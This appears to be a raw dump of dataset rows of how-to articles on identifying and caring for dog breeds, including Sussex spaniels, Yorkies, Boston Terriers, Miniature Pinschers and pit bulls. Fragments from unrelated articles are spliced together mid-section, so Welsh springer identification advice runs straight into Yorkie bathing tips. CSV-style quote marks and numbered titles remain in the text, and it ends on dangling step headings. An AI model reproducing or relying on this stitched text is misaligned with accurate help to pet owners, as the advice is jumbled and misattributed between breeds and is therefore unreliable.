, The Sussex spaniel's ears are thick and fairly large. They hang straight down from the point at which they are attached to the head, meaning they are consider drop or pendant ear. They are also set moderately low, just slightly above the outside corner of the eye, and they hang down to the bottom point of the dog's head.The ears are covered with wavy hair that if very soft to the touch.

, The skull of the Sussex spaniel is relatively long and wide. The skull also has quite an indentation where the eyes sit, resulting in a pronounced forehead.The muzzle should be about three inches long, starting at where it meets the cheeks. It should be broad and squared off.
The Sussex has pronounced nostrils that are brown in color, which is sometimes described as ""liver-colored.""
The lips are somewhat loose and they hang down a bit.

, The neck of the Sussex spaniel is relatively short for its body size. The neck is also strong and slightly arched. Because the neck is short, this means the dog's head does not not go much above the dog's body when it is holding its head upright.


There should not be much loose skin hanging down below the chin., Most purebred Sussex spaniels have docked tails, meaning that their natural tails are cut off for cosmetic reasons.The tail is docked so that it is only 5 to 7 inches (12.7 to 17.8 cm) long but still has some movement ability.Sussex spaniels without docked tails have tails that are more than a foot long., The shoulders of the Sussex spaniel are laid back and muscular. The legs are set well under the dog. The hindquarters are strong, well-rounded, and sturdy looking. They should be parallel with each other and set apart as wide as the dog is at the shoulders. The hind legs are shorter than the front legs but shouldn't look like it because they are attached to the body at a lower point. They also look strong and should not be bent at the hocks, which is the joint at the middle of the back legs.The forelegs may show a slight bow.
The feet are large and round, with short hair between the toes. The feet on the rear legs are just like the feet on the front legs.

, The Sussex spaniel's color is described as a rich golden liver color, which is a term used to express its warm brown color. This is the only acceptable color for show dogs and is used as a good sign of purity for those concerned with the breed. These dogs tend to have a thick, rich coat with is flat or only slightly waved.The fur on the legs of a Sussex spaniel is feathered, meaning it flies away from the body, but clean below the hocks. This is typically accentuated with grooming practices.
The tail is thickly covered with moderately long fur, which is also feathered.
When groomed to show standards, the fur between the toes must be left long enough to cover the nails.
A dark liver or puce color is not acceptable in show dogs, as it signals that the dog is not pure bred. There may be some white on the chest, but white on any other part of the body is also not acceptable.

, Ideally, the height of the Sussex spaniel should range from 13 to 15 inches (33 to 38 cm). This height is measured from the withers to the ground. The weight of the Sussex spaniel should range between 35 and 45 pounds.The whole body of the Sussex spaniel is characterized as low and long with a level topline.
The chest is round. This is especially true right at the shoulders, where it is deep and wide. The back and loins of the dog are also long and very muscular.

, The Sussex spaniel is rectangular in shape. This is because its body is longer than the dog is tall. Even with this rectangular outline, the dog should read as muscular and strong rather than stubby.When looked at closely, the dog's legs may look short in proportion to its body.

, The gait (how the dog looks when moving) is also important for identifying the Sussex spaniel. The Sussex spaniel has what is known as a rolling gait. This is created by its deep and wide chest moving in combination with its short legs and long body. This means that the dog makes a slight alternate rocking motion over its shoulders when it walks.This movement looks deliberate and smooth, not clumsy.
The head of a Sussex spaniel is generally held low when moving.

, If you have access to your dog's pedigree, you should use that to identify your dog's breed. A purebred Sussex spaniel will have two parents that are both Sussex spaniels.


If you got your dog from a dog breeder, they should have pedigree information available to you. If you did not get your dog from a breeder or from someone who knows the dog's parents, then pedigree information will not be available to you.

, Your veterinarian looks at many, many dogs every year. Because of this, and the fact that they have studied many types of dogs, they may have a good idea about whether your dog is a Sussex spaniel.


Your can also ask the opinion of other dog experts, such as dog groomers and dog trainers.

, There are several companies that now offer DNA testing kits for dogs. This type of testing can determine which breed strains are present in your dog. For example, a DNA test might be able to tell you that your dog is 60% Welsh springer spaniel and 40% Sussex spaniel.If your dog has any purebred relatives, the test should be pretty accurate. However, if your dog is a mix of a variety of breeds, the test will be less accurate.

Consider DNA testing.",How to Identify a Welsh Springer Spaniel4," If you got your dog from a dog breeder they should have information about the dog's heritage, known as its pedigree. Even if you got your dog years ago, the breeder should still have this information for you.


A dog's pedigree is important for good and ethical breeders to know about, as it is key for making sure that their dogs are well bred and not inbred.

, Talk to your veterinarian and ask them if they think that your dog might be a Welsh springer spaniel. Your veterinarian likely sees hundreds of dogs every year, so they may have a good idea about how to identify that breed.


You can also ask other people who deal with dogs professionally, such as dog groomers and dog trainers.

If you bathe too frequently, the dog’s skin may become overly dry and cause irritation.
Long haired Yorkie coats need both shampoo and conditioner to keep the hair strong and clean.
Many owners find that bathing Yorkies in deep sinks, like a kitchen sink, can be easier than a bathtub due to the dog's small size.;
, Yorkies have long silky coats that need to be trimmed frequently to maintain their appearance. Their coats can become easily tangled and matted if not properly groomed. They do not shed their coat and will only lose small amounts of hair when bathed or brushed.


You can either trim the hair yourself or hire a professional dog groomer.
Some owners choose to forego the daily maintenance of a long coat and keep their Yorkie's hair cut short.

, Yorkie coats are long and can become easily tangled if they are not brushed daily. You may decide to trim the coat to a shorter length for convenience and appearance, though short coats also require frequent brushing.


The hairs of the coat can break easily if owners brush too hard. You can purchase a leave-in conditioner to moisturize the hair after it has been brushed.

, Yorkies have hair that grows like bangs over their faces. You can either trim this hair regularly to keep it very short or make a topknot that will keep the hair out of your dog’s eyes.Use a fine-toothed comb to make sure there are no knots in the hair. Gather the hair together into a small section and secure it with band. Many owners use bows or barrettes to pull the hair together and to accessorize.

, Like all dogs, Yorkies have nails that continue to grow over time. Trim their nails every 2 to 3 months to avoid breakage or overgrowth.


Check your dog’s nails if they appear to be biting them. Nails can become ingrown and cause pain and discomfort .

, Yorkies are prone to early tooth decay and oral hygiene problems like plaque and tartar buildup. You need to brush their teeth daily to help to prevent tooth decay.Use a soft toothbrush that is designed for dogs and also use a dog toothpaste. Regular toothpaste can upset your Yorkie’s stomach and cause health problems.
It is recommended that you have their teeth professionally cleaned every 2 years by an experienced veterinarian.

, Without strong leadership, Yorkies can be very bossy and attempt to run the household. When you are training your dog, you need to be firm and consistent in your training. Many Yorkies suffer from “Small Dog Syndrome” and think they are the boss. They exhibit poor behavior, like aggression towards other dogs, jumping on people, nipping and biting, and excessive barking that wouldn’t be tolerated in larger breeds.
Set healthy boundaries with your pet by staying firm in your commands. Trainers suggest not letting Yorkies on furniture, not carrying them, and making them follow commands (like sit, stay, come) before they are fed., Yorkies can be trained to follow a number of commands. They are motivated by food and praise and aim to please their owners. Commands like sit, stay, and come are all extremely important to learn. Yorkies should also be taught to walk on a leash even if they are primarily indoor pets.


Use positive reinforcement, like treats or praise, to reinforce good behavior. It is important to reward them immediately after they have successfully completed your command so they begin to associate following your commands with rewards.

, When it comes to training, practice makes perfect. Practicing the obedience commands you want your Yorkie to learn each day in 15 minute intervals can help to cement these behaviors.Training is a good way to provide much needed mental stimulation for your Yorkie. When Yorkies are bored, they can exhibit destructive behaviors like chewing on furniture or nipping.

, If you are having trouble training your Yorkie, obedience classes are a good way to establish yourself as the pack leader and to learn good training techniques. It is also a good opportunity for your Yorkie to socialize with other dogs and new people.


There are classes for puppies and adult dogs, and most will allow you to sit in on the classes so you learn proper techniques. Look for obedience classes at local pet stores and at your veterinarian's office.

, Socialization teaches your Yorkie the appropriate way to interact with other animals and new people. Yorkies should be exposed to a variety of people, animals, and experiences so they become comfortable and calm in new situations. Meet your friends or acquaintances with your dog in a neutral space, like outside, rather than inside the home, which could make the Yorkie nervous and territorial. Allow your friends to give your dog a treat, if that is aligned with your feeding guidelines for your Yorkie.


Yorkies are overprotective dogs and can be territorial over their owners. This negative behavior can be corrected through frequent socialization and correcting your dog when they become defensive.

, Yorkies are small dogs with big personalities who don’t always realize how small they are. When they meet other dogs, they may act aggressively or bark excessively. Be careful not to respond to the Yorkie in a way that rewards this behavior. A good strategy is to train the dog to respond to the ""Look"" command, so you can divert the Yorkie's attention away from the other dog, then lead it away.


Ask a friend to meet you at a park with their dog for a playdate with your Yorkie. Let the two dogs interact and play with each other but be on the lookout for any aggressive behavior.

, Yorkies are very attached to their owners and families and love their attention. Pats on the head, pets, belly rubs, and praise go a long way in establishing a healthy bond with your Yorkie.


Yorkies can do well with small children but it is important to make sure the child is being gentle with the dog. Children should be affectionate as well but be aware that they could hurt the dog.

, Healthy Yorkies have a lifespan of 12 to 15 years. They need regular veterinarian care and health check ups to keep them healthy.


Expect to see your veterinarian at least once a year for regular wellness checks. The veterinarian will monitor your dog’s weight, vital signs, and ask about any behavioral changes.
Pay attention to changes in your dog’s behavior like eating less, acting lethargic, or acting aggressive. Take them to the veterinarian if you notice these symptoms continue over a few days or become increasingly severe.

, Yorkies are more prone to some diseases than are other breeds. Some diseases can be detected through genetic tests and others are environmental.


One of the most common diseases in Yorkies is liver shunt. Responsible breeders will genetically test for liver shunt before breeding litters but the condition can still appear as a birth defect. If your dog becomes lethargic, is urinating very frequently, has seizures, or is vomiting take them to your veterinarian.Like other toy breeds, Yorkies are at risk of developing hypoglycemia, or severe drops in blood sugar. Dogs that are shaking, fainting, drowsy or weak may be suffering from hypoglycemia. Small meals fed throughout the day can help to prevent this condition.
Yorkies are at high risk of sustaining bone fractures and concussions. They can sustain bone fractures after jumping off furniture, being stepped on, or falling. You can prevent these by keeping Yorkies off furniture., Even if your Yorkie rarely goes outside they need to be fully vaccinated. Some vaccinations need to be administered every year.Your Yorkie may be a risk to other dogs until the vaccinations are complete, usually around 14 weeks. Until then, keep your puppy away from unfamiliar dogs, as well as any dogs that are unvaccinated or sick. Ask a vet whether it's okay for your puppy to play with healthy, vaccinated dogs.
Depending on the area you live in, your veterinarian may recommend additional vaccines. For example, if you live in a high risk area they may recommend that your Yorkie receive yearly Lyme disease vaccinations., Microchips contain your identification and contact information. Veterinarians highly recommend implanting a microchip in your dog so that in the event your Yorkie is lost or stolen, it can be returned to you.


Microchips are usually injected into the scruff of a dog’s neck or by their shoulder blades. They can be administered during a regular veterinarian visit without anesthesia. , Parasites like fleas, ticks, mites, and internal parasites can all use your dog as a host. There are a number of over the counter treatments and prevention methods that you can use to protect your dog.


Fleas and ticks feed on blood and mites will burrow in your dog’s skin. If they are infested, you will notice them scratching and biting at an area extensively. If you see small rice or spaghetti like substances in your dog’s feces, they may have an internal parasite.There are monthly tablets, injections, skin treatments, and powders available for purchase that will prevent these common parasites. Some products are more effective than others, so you may need to experiment or consult a veterinarian.
Your veterinarian may recommend parasite preventions appropriate to the area that you live in.

, Unless you plan to breed your dog, it is highly recommended that you spay or neuter your pet. Spaying and neutering has health and behavioral benefits.Yorkies that are desexed are at a lower risk of some diseases, like prostate or uterine cancers, and have longer lifespans than dogs that are not desexed.
Neutering can also lessen aggressive behaviors in male Yorkies.

, Yorkies do not need large amounts of food, particularly if they are adults and not very active. You can feed your Yorkie once a day, twice a day, or leave their food portion out for the duration of the day.Always make sure that your Yorkie has access to clean water. Since these dogs are very small, purchase a water bowl that is shallow enough for them to reach into.
Puppies have higher caloric needs than adult Yorkies and can be fed on a schedule that is conducive to housetraining. Healthy Yorkies can eat any type of commercial dog food and do not require any special diets. If you have concerns about your Yorkie's nutrition or health, speak with your veterinarian.
Avoid overfeeding your Yorkie to help them maintain a healthy weight. Overweight Yorkies are at a higher risk of developing heart conditions and diabetes.

, This breed has a lot of energy and needs physical exercise to maintain their weight and to keep them happy. They were originally bred to be working dogs so they have much more energy than most toy breeds.Yorkies enjoy going on long walks with their owners and engaging in retrieval games like fetch. They enjoy playing in fenced-in yards, either by themselves or with other dogs, or at dog parks where they can run freely.
Since Yorkies are small, weight gain can significantly impact their health. Along with a healthy diet, exercise is the best way to prevent pet obesity.

Devote plenty of time to teaching your dog the house rules (like where you want him to toilet) and any other social rules you want him to follow (like no barking at people). If you can't give plenty of time to training, consider whether you should adopt a Yorkie.


Many people return their dogs to animal shelters because they don't realize the time, cost, and effort needed to train.;
, Begin training your Yorkie as soon as you bring him home. Expose him to as many new people, environments, and situations as you can. If you can, take him on car rides, visits to the park, and short walks around the neighborhood. Just make sure that your Yorkie has his first set of vaccines before socializing him.


Let your dog have a chance to interact with men, women, and children in a positive way so that he's not scared of people.
Consider enrolling your Yorkie in an obedience training or puppy socializing class. Ask your veterinarian, local pet store, or community class organization to recommend a program., Start teaching your Yorkie basic commands like ""sit"", ""stay"", or ""down"". For example, you can teach your dog to sit by making him stand in front of you. When you have his attention, show him a treat between your fingers and hold it just above his head. Gradually move the treat back between his ears and he'll naturally follow it. Command him to ""sit"" as he begins to sit and immediately reward him, saying ""good, sit"" simultaneously.


Train your dog when you have his full attention. If your dog starts to lose interest or is having trouble listening, stop the lesson and try again later., Yorkshire Terriers respond well to positive reinforcement and training. Teach commands by rewarding your dog when he obeys the command or makes positive steps. The reward could be food or verbal praise. Never reward negative behavior or you'll simply reinforce the bad behavior.


Be consistent in your training. Remember to immediately respond to your dog's behavior so your Yorkie knows what to expect., The breeder should have taken your Yorkie to a vet at six weeks of age for an exam, his first distemper shot, and a dewormer to kill internal parasites. Ask for a bill or invoice from the vet to prove this was done.You should always research the breeder before purchasing a dog.

, Your Yorkshire Terrier will need to return to the vet for a second dose of dewormer two weeks after his initial visit. This will kill any residual worms. Make sure your dog gets regular veterinary care, including the following vaccines according to this schedule:Heartworm preventative at 8 weeks, then once a month during heartworm season (or year round depending upon your veterinarian’s recommendation.)
Lyme vaccine at 9 weeks, followed by a booster at 12 weeks
Rabies vaccine at 12 weeks
Spay or neuter operation at 6 months
An annual exam and vaccine booster starting at 1 year of age
Twice yearly examinations starting at 10 years of age

, Put a small dab of dog toothpaste on your finger and let him lick it off. Then, place a little paste on the brush and wipe it along the gums. The next day, brush a little toothpaste along the gums and outer surfaces of the outer teeth. Try to brush more teeth every day, until you're able to brush all the outer surfaces of the teeth.You don’t need to try to brush the inner teeth because most plaque attacks the outer teeth.
Get your Yorkie used to teeth brushing, which is important since they have crowded teeth. These tight spaces are perfect for bacteria and plaque to collect, causing tooth loss and decay.

, The veterinarian will check your Yorkshire Terrier's teeth at his annual exam. But, you'll still need to take your Yorkie for a professional tooth cleaning to remove bacteria and plaque under the gums even if you brush his teeth daily. Get your Yorkshire Terrier's teeth professionally cleaned at least once a year.While you are brushing, check for any sores, loose teeth, or growths in your Yorkie's mouth. If you find any, take your dog to the veterinarian for an examination.

, A Yorkie is prone to several health problems because of its small size, especially broken bones. Your bold little dog may try to take on much larger dogs which can lead to injuries. Always keep your Yorkie on a leash and by your side when you take him out. Be aware that your Yorkie may be affected by:Patellar (kneecap) luxation: The kneecap slips out of place in varying degrees. Your dog may need surgery if he's crippled, although some dogs are only mildly affected.
Collapsing trachea: Pressure from pulling on collars can cause your Yorkie's trachea to collapse in varying degrees. It's a good idea to use a harness instead of a collar for Yorkie's with this health condition.
Legg-Calve-Perthes Disease: Limping and muscle atrophy is caused by a problem with the blood flowing to the thigh bone and pelvis. Surgery corrects this condition.

, Feeding your dog a high-quality food is one of the best things you can do to keep him healthy throughout his life. Read labels on commercial pet food. Pick a food that lists meat (not meat by-products) as one of the first two ingredients. Or, ask your veterinarian to recommend a product for your dog.Always keep fresh, clean water out for your Yorkie at all times.
Some foods are formulated to keep bacteria off the teeth and grind plaque. You can also look for small-sized kibble which will help your dog get the food into his small mouth.

, If you don't want to purchase dog food, you can make your own. It's important to offer a properly balanced diet to prevent deficiencies in his diet.Consult an animal nutrition expert to help you create a personalized diet for your Yorkie. Try contacting a veterinary college to meet with an animal nutritionist. When making food for your dog, remember that there are some human foods you should never give him. These include:Alcohol
Avocados
Chocolate
Grapes and raisins
Macadamia nuts
Fatty meat scraps
Cooked bones or chicken bones in general
Onions, garlic and chives
Yeast dough
Xylitol (found in sugar-free foods, including some peanut butters)

, To keep your Yorkshire terrier fit and trim keep snacks to a minimum. Avoid feeding him human food from your plate or he may stubbornly refuse to eat his own food.Try giving him a few pieces of its dog food (especially dental foods), low-calorie dog treats, baby carrots or low-sodium canned green beans.


While you can give your dog dental treats (which help reduce plaque), remember that they add calories to his diet.

, Comb your dog's fur and mats every day, if he has longer hair. Or, comb him weekly if you keep your Yorkie's hair clipped short. Combing will keep your dog's hair in good condition and can prevent tangles.Since the Yorkshire Terrier has a longer coat, you may want to have him professionally trimmed
Even if you get professional grooming, you may prefer to trim around your dog's eyes.

, Your Yorkie only needs a bath every three or four weeks. Bathing more frequently can dry out his skin too much. Completely comb his hair before bathing to prevent tangles. Only use dog shampoo and make sure to rinse out all shampoo and conditioner completely. Any residue can cause itchiness and skin problems. Brush out your Yorkie's hair after bathing and drying to prevent mats from forming.


While bathing, check your dog's skin for fleas, ticks, lumps, bumps, cysts, scabs, scratches, or redness. Treat fleas using a topical spot-on product and monitor any other skin conditions. Pay attention to other skin conditions and contact the veterinarian for an exam.

, Look at your dog's nails every week to see if they're getting long. If they need to be trimmed, simply clip the white tip of the nails. Avoid cutting the ""quick"" (the darker part of the nail that contains blood vessels and nerves). If you need help locating this pink triangle (as seen on white nails) or have a dog with dark nails, ask a veterinary technician to show you how to trim the nails.Get in the habit of checking the nails during combing time. This will make it easier to remember to do this task.

In general, Boston Terriers are known to have some of the following positive traits which can make them fun and easy to care for:Friendly, good-natured temperament. Good with kids and other pets.
Not many grooming needs
Playful and lively, but not hyperactive.
Small but resilient.;
, While Boston Terriers make great companions for the reasons above, they aren't without their shortcomings. The ""cons"" below can make them a little more difficult to care for than other breeds:Can have behavior problems if not bred well.
Sometimes tricky to housetrain.
Can drool frequently or suffer from bad gas (seriously).
Can tend to make lots of noise (not just barks, but also wheezing, snorting, huffing, sniffling, and snoring).
Can be vulnerable to certain health problems (see section below).

, Boston Terriers need:A place to live where they can spend much of their time indoors (they do not tolerate heat or cold well).
A place to live where they won't be constantly left alone (they suffer from separation anxiety easily)
A trainer who's willing to be patient, gentle, and light on punishment (Bostons can be a sensitive breed).
Frequent checkups with a vet.
An owner who's willing to take special efforts at home to protect the dog from likely health issues.

, With their small builds and moderate energy levels, Boston Terriers don't require lots of food. Give your dog 1/2 cup to 1 1/2 cups of high-quality dry food once in the morning and once in the evening. A selection of well-reviewed dog foods is available here. Accompany each meal with a generous amount of water — the dog will stop drinking on its own when it's satisfied.The exact amount of food your dog will need depends on how big it is and its activity level. Bigger, active dogs may require the full 1 1/2 cups, but you don't have to give this much for smaller, less active dogs.
Resist the urge to feed the dog outside of its main meals. Boston Terriers are vulnerable to both obesity and flatulence, which extra meals and decadent treats can make worse.

, Exercising your dog every day is a great way to keep it happy, healthy, and well-behaved. Most Boston Terriers will be more than happy to go on a walk around the neighborhood with you every day. Bostons also love running and playing in the yard or at a park.


Note that excessive exercise is something you'll want to avoid, as this can put stress on Bostons' weak hearts. During heavy exercise, watch for signs of fatigue, like gasping, coughing, bluish gums, and an obvious desire to stop moving. These are all signs that the dog should be moved indoors and given a chance to rest.

, One of the great things about Boston Terriers is that they don't need much grooming. Below are the most important grooming tasks to be aware of:Coat: You only need to do this if and when the coat looks dirty or shaggy. Brush gently in the direction of the hair with a natural fiber brush or a hound glove.

Bathing: Bathe the dog only when needed — for instance, if it's been playing in some mud or you notice that it smells bad. Washing too frequently can strip the natural oils from the coat. Use a mild soap made for smooth-coated dogs.

Nails: Either have a professional groomer handle this or use a rotary sander on very low speed to tap gently at the tips of the nails. Nail clippers can hurt the dog if you clip too close to the base.

Teeth: This is the only grooming task you'll need to do frequently, as Boston Terriers are vulnerable to dental problems. Two to three times a week, use a baby toothbrush or a washcloth wrapped around your finger to apply special dog toothpaste to both sides of the teeth.

, Boston Terriers love attention. Without enough of it, they can easily become depressed or anxious.For your dog's happiness, try to have at least one person in your family spend a little ""one-on-one"" time with the dog every day. Luckily, there are many different ways to do this. Here are just a few ideas:



Play with your terrier. Bostons love games like fetch, tug of war, chase, and play-wrestling. Remember, however, that this breed is small and light — play gently. Be aware that gentle nipping during physical games is normal.
Cuddle with your dog. Boston Terriers are very affectionate and love close contact. Beware of this breed's tendency for drooling and flatulence. Don't cuddle with your dog places where it's not normally allowed to go (e.g., if your dog isn't allowed in bed, don't cuddle with it there).
Pet your dog. Boston Terriers respond best to positive reinforcement, so you may want to use this form of affection as a reward when training it.

, Boston Terriers are good-natured dogs, but they can require a little extra care and attention when it comes to training. In particular, they tend to be sensitive to angry voices.Snapping or yelling at your dog can overwhelm it and make it unresponsive to further training, so resist the urge to respond to the dog's bad behavior with your own.


Instead, use positive reinforcement, which Bostons respond very well to. When your dog gives you the behavior that you want, reward it with affection, play, or a small treat. Withhold your affection for bad behavior, rather than responding with anger.

, This is another training area where Boston Terriers require a little more work than the average dog. While your dog is learning this important behavior, be patient and persistent — with consistent, regular training, it will learn. See our housetraining article for specific training strategies. A few tips to remember include:


Try not to leave your dog unsupervised indoors before it's house trained. If you have to leave, use a crate or kennel. Dogs almost never soil the place that they sleep.
Let your dog out frequently. Ideally, you'll want to give it a chance to use the bathroom after it wakes up, before it goes to bed, after meals, and before and after you put it in a crate.
Praise or reward your dog every time it goes to the bathroom outdoors. As noted above, Bostons respond well to positive reinforcement.If you catch your dog in the act, use a stern ""NO"" to get it to stop. Don't scold or hit it. This can confuse the dog, making it more difficult to housetrain.

, All dogs benefit greatly from the process of socialization — introducing them to new things in a safe, controlled environment. If you can give a dog pleasant, positive experiences with new things as a puppy, you can avoid a host of behavioral problems later on in life. While it's possible to socialize a dog at any age, most professionals recommend starting around 8-12 weeks of age.A good guide to socializing your dog is available here. The general principle is that you'll want to introduce your dog to new people, animals, objects, and places gradually and one at a time. Make your dog feel safe by staying near it and offering plenty of affection when it reacts well.
Things to socialize your dog to include: children, other dogs, new places, cars, loud sounds, people who use a cane or wheelchair, odd objects like umbrellas, and so on.

, This is a controversial opinion among some dog owners, but there are many, many good reasons to give your dog this procedure. In addition to being quick, cheap, and safe, spaying or neutering your dog:Prevents unwanted puppies.
Results in a less-aggressive temperament.
Prevents undesirable sex behaviors like humping, urine marking, and female ""heat"" behaviors.
Prevents many types of cancer.

, If there is only one single thing you do to improve your dog's health, make it this. Veterinarians have the training and tools to make sure your dog is as healthy as possible at every stage of its life. However, they can only keep your dog healthy if they get a chance to see it when it's needed. Dogs at different ages need to see their vets at different frequencies. See below:Birth to one year: About every three to four weeks. Your dog will get many important vaccines during this period.

One to seven years: About once per year. Your dog will get tests for common problems like heartworm and other parasites as well as a few more vaccines.

After seven years: About twice pert year. As dogs get older, they become more vulnerable to health problems, so treatments can become more frequent if the vet notices something wrong.
You'll also want to take your dog in whenever you think it may be sick or you notice a significant change in its behavior.

, Boston Terriers have been bred to have very short noses, which makes them prone to this disease (also known as Respiratory Distress Syndrome). The dog's small airway can make it hard to breathe at times, especially during exercise. Be on the lookout for signs that it's not getting enough air (most of which are obvious). If you see any of the following, give the dog plenty of time to catch its breath:


Gasping or wheezing for air
A reluctance to move or exercise
Bluish gums
Fainting

, Dental health is important for all dogs. However, it's especially important for Boston Terriers, who are vulnerable to tooth problems (as mentioned above). Talk to your veterinarian about the possibility of regular teeth cleanings for your dog. Generally, a healthy dog will only need its teeth cleaned once every one to three years.A professional cleaner will thoroughly clean your dog's mouth to remove tartar and bacteria buildup. Even the area under the gum line will be cleaned. This usually requires general anesthesia — in other words, your dog will be temporarily knocked out.
Believe it or not, this is actually a very important part of a dog's health. Left untreated, dental disease can cause the dog to lose teeth, put extra stress on its kidneys, and even shorten its lifespan., Boston Terriers tend to have big, bulging eyes. This makes them a little more vulnerable to injury or infection than the average dog's eyes.It can also make it more difficult for the dog's eyes to heal after an injury. Be sure to notify your veterinarian immediately if you notice any change in your dog's eyes — you may end up saving its vision.


One easy way to cut down on eye injuries is to keep your Boston Terrier from riding in the car with its head out the window. This is a frequent source of eye injury — it's easy for things to unexpectedly get blown into the dog's face.

, Boston Terriers are prone to several genetic disease that cause skin irritation, such as Cushing's disease.Your vet will check for these problems at your dog's physical, but it's also a wise idea to be on the lookout for them yourself. Signs to look for include:


Patches on the skin where the dog seems to be balding
Red, irritated patches
Foul-smelling patches
Frequent itching or scratching

Miniature Pinschers are well-balanced, sturdy, and compact. Their bodies are muscular, well-defined, and their extremities are proportional to the rest of their bodies. Look for the following characteristics to identify a Min Pin:


The neck is slightly arched and curved and blends into its body at the shoulders. The skin on the neck is taut, with no loose skin hanging in the area.
Their bodies have a slight wedge shape with a well-developed chest. Their ribs are rounded, rather than flat. Their bellies are moderately tucked, forming a slight curve from under the rib cage back to the hind quarters of the dog.
This breed’s tail is docked and stands erect. The tail is set high on the hindquarters of the dog.;
, Miniature Pinschers are a small, compact toy breed. On average, a Min Pin ranges in height between 10 and 12 ½ inches.The average weight of this breed is between 8 and 11 pounds., The shape and features of a dog’s head can also give clues to its breed. Study the dog’s head shape, eyes, and ears to help you make a determination.


A Miniature Pinscher’s head is narrow and its foreface is not exceptionally prominent.
Miniature pinschers’ eyes are slightly oval and dark—usually dark brown, but they may even be black. They are clear, bright, and have a rim around the outside of the eye. This rim is also dark brown or black.
This breed’s ears may be either cropped or uncropped. They are set high on the dog’s head and stand straight up from the base of the ear to the tip., Studying the forequarters and hindquarters can also give you clues as to whether a dog is a Miniature Pinscher. This breed exhibits straight, parallel lines on its legs.When viewed straight on, the Miniature Pinscher’s front legs are straight and the elbows at the top of its front legs are held close to the dog’s body.
Its feet are small and round, similar to those of a cat. It has arched, closely-knit toes and deep pads on the bottoms of its feet.
Viewed from the rear, the Min Pin’s hind legs are straight and parallel. When viewed from the side, the dog’s hind legs angle back, with the back paws sticking further out than the rest of its body., Min Pins have a distinctive high-stepping gait when they walk or run. This gate is similar to that of a horse pulling a cart or carriage., This breed is small in stature, but exhibits tons of personality. Miniature Pinschers are confident, fearless, alert, and energetic. They make great watchdogs and will not hesitate to take off after anything that peaks their curiosity."
"
Look for its distinctive mustache and beard.,
Notice the look and feel of its coat.,
Look at the color of the coat.",How to Identify a Miniature Schnauzer3," Miniature Schnauzers are known best for their facial hair, especially their bushy moustache and beard. The facial hair on a Miniature Schnauzer falls straight around its muzzle, accentuating the rectangular shape of this breed’s head. Miniature Schnauzers have bushy eyebrows as well.


In addition to their distinctive facial hair, Miniature Schnauzers also have long hair on their legs, which hangs straight and nearly grazes the ground., The Miniature Schnauzer has a double coat. This means the underside of its coat looks and feels different than the top side. Miniature Schnauzers have a soft undercoat and a wiry outer coat. This breed’s fur is medium-length., Miniature Schnauzers can be one of three colors—salt and pepper, black and silver, and solid black. The salt and pepper color combination is by far the most common in Miniature Schnauzers. In salt and pepper colored dogs, the salt and pepper mixture can fade to light grey or silver in the eyebrows, whiskers, cheeks, across their chest, and in their leg furnishings, or the long hair on their front and back legs. The black and silver combination may follow the same pattern as the salt and pepper, fading to a lighter shade in specific areas."
"
Notice its coloring.,
Identify rust-colored markings.,
Look at its coat.",How to Identify a Miniature Pinscher2," Miniature Pinschers’ coats are solid in color and consist of one of the following color combinations: solid red or stag red (dark red with black hairs intermingling), black and rust, or chocolate and rust., Although the Min Pin’s coat is solid, it can have rust-colored markings. These markings are well-defined and do not bleed into the prominent coat color. Markings can be found on the cheeks, lips, lower jaw, throat, bottom of the front legs, inside of the hind legs, and the lower portion of the heels and feet. They may also have twin markings above the eyes or on the chest., Min Pins have a short, shiny, smooth coat. Their hair is straight, laying flat along their bodies. This breeds coat stays naturally well-groomed and neat."

Get in the right frame of mind.,
Introduce your dog to the bath routine.,
Select an appropriate shampoo for your pit bull.,
Put on old clothes.,
Gather your supplies and prepare the bathtub.,
Take your dog for a long walk or run.,
Brush your pit bull thoroughly.",How to Bathe Your Pitbull1," Pit bulls are known to be stubborn, so you will have to be firm and consistent when getting them used to bathing.


Set aside enough time for the bath, since you will be less stressed if you are not pressed for time.
Maintain control of the situation and let your pit bull know that you are in charge.It is easier if you can get your pit bull used to baths when they are young.;
, If your dog runs away and hides when it is bath time, you will need to approach the situation with a calm demeanor and incorporate lots of rewards and treats.Be calm; talk with your pet in a reassuring voice. If you are low key and not agitated, your dog is more likely to remain somewhat calm as well.
Coax your pit bull into an empty tub and reward them with a treat. It is useful to do this for a few times a day in the week leading up to the bath. Let your pit bull just spend time in an empty tub.

, Do not use human shampoo for your dog, because ingredients in them (like fragrance) can irritate your pit bull’s skin.Read all instructions on the shampoo to see whether it needs to be diluted. You can also check the label to see how long the shampoo should remain on the dog before rinsing.Ask your veterinarian for recommendations on shampoos that would work well for your pit bull. , Odds are, you will get as wet as your dog during the bath. If you have on old clothes, or even a bathing suit, you will be happier after the bath.

, The whole bathing process will go more smoothly if you have everything you need and aren’t rushing around trying to find extra towels or dog shampoo.


Have extra towels nearby and lining the floor, so no one slips during or after the bath.
Place a non-skid mat in your tub so your dog doesn’t slip and get hurt during the bath.
Keep your dog’s brush and shampoo within reach, so your pet doesn’t escape the tub while you go searching for the shampoo.
Stock some treats in the bathroom to use as rewards during the bath.

, After vigorous exercise, your dog won’t have as much energy to resist a bath. Additionally, if they are hot and sweaty, they may welcome a bath., Although brushing your pit bull should be a regular part of your grooming routine, it is also important to brush your pit bull right before bath time. This pre-bath brushing will help remove any dead hair.
Matted hair will hold onto water and not dry well, resulting in irritated skin. By brushing before the bath, you can eliminate this issue."
"
Identify a wedge-shaped head.,
Look for dark brown, medium-sized eyes.,
Identify the spectacles.,
Look for erect ears.",How to Identify a Keeshond1," When viewed from the top, the Keeshond’s head, i.e., the muzzle to the skull, should be wedge-shaped. Its head is neither too large nor too small, but proportionate to its body. Short, smooth hair covers the Keeshond’s head and muzzle.By covering the ears and nape of the neck with your hands, its head and muzzle should form a wedge-shape.
An apple-shaped head (as opposed to a wedge-shape) when viewing the Keeshond’s profile are disqualifications.;
, Almond shaped eyes that are set neither too wide nor too close together is also characteristic of the Keeshond. The rims of the eyes are black in color as well.Protruding, round eyes, as well as colored eyes, are a disqualification.

, The expressive markings and shadings around the Keeshond’s eyes is a distinctive characteristic that gives it an intelligent and curious expression. Orbital shading around the eyes and a dark line that slants from each corner of the eye combined with expressive eyebrows resembles a pair of spectacles.The absence of the slanting dark lines from the corners of its eyes is a disqualification.

, The keeshond’s ears are rectangular in shape and small, but proportionate to its head. Its ears are set high on its head and stand erect. Smooth, soft velvety hair covers the ears.Non-erect ears are a disqualification.

Find out the health history of your Aussie.,
Take your Aussie to the vet for regular check-ups.,
Be alert to potential joint conditions.,
Watch out for food allergies.,
Be vigilant about flea control.,
Feed your dog a healthy diet.,
